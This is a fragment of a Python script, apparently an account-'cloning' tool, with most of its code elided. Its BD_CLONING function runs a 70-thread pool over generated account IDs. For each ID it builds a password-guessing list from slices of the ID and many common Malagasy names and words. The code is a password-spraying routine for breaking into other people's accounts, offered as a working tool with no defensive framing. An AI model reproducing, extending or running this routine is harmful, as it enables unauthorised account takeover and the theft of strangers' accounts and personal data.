...
def BD_CLONING():
    ...
    with tred(max_workers=70) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'koloina','Koloina','malala','Malala','felana','Felana','mamiko','Mamiko','sarika','Sarika','fitiavana','Fitiavana','mahery','Mahery','papako','Papako','mamako','Mamako','malalako','Malalako','tahiry','Tahiry','vadiko','Vadiko','mahandry','Mahandry','harena','Harena','nekena','Nekena','nirina','Nirina','mahefa','Mahefa','harena','Harena','Fiderana','valisoa','Valisoa','valimbavaka','Valimbavaka','fitiavako','fanilo','anjarako','saholy','salohy','lalaina','tsilavina','tahina','anjara','nilaina','fanasina','hasina','jesosy','dadako','badoda','heritina','nomena','fandresena','finoana','fiderana','nantenaina','harena','tahiry','valisoa','tantely','tanjona','sarika','fanasina','felana','malalako','fanasina','mahery','seheno','santatra']
